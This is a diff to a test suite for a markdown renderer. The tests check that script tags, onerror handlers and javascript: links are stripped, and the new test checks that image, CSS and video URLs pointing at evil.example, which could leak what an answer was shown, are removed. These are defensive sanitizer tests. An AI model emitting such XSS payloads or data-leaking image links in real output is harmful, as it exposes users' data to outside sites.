@@ -39,11 +39,19 @@ describe('renderMarkdown', () => {
   it('strips scripts and event handlers, and opens links in a new tab', () => {
     const div = html('<img src=x onerror="alert(1)"><script>alert(2)</script>[link](https://example.com) [bad](javascript:alert(3))')
     expect(div.querySelector('script')).toBeNull()
-    expect(div.querySelector('img')?.getAttribute('onerror')).toBeNull()
+    expect(div.querySelector('img')).toBeNull()
     const links = div.querySelectorAll('a')
     expect(links[0]).toHaveAttribute('target', '_blank')
     expect(links[0]).toHaveAttribute('rel', 'noopener noreferrer')
     expect(links[1]?.getAttribute('href') ?? '').not.toContain('javascript')
+  })
+
+  it('loads nothing from elsewhere, so an answer cannot carry what it was shown to another site', () => {
+    const div = html('![notes](https://evil.example/?q=notes) <span style="background:url(https://evil.example/x)">x</span> <video poster="https://evil.example/p"></video>')
+    expect(div.querySelector('img, video')).toBeNull()
+    expect(div.innerHTML).not.toContain('evil.example')
+    // Maths keeps its inline styles.
+    expect(html('$x^2$').querySelector('[style]')).not.toBeNull()
   })
 
   const citations = (div: HTMLElement) =>
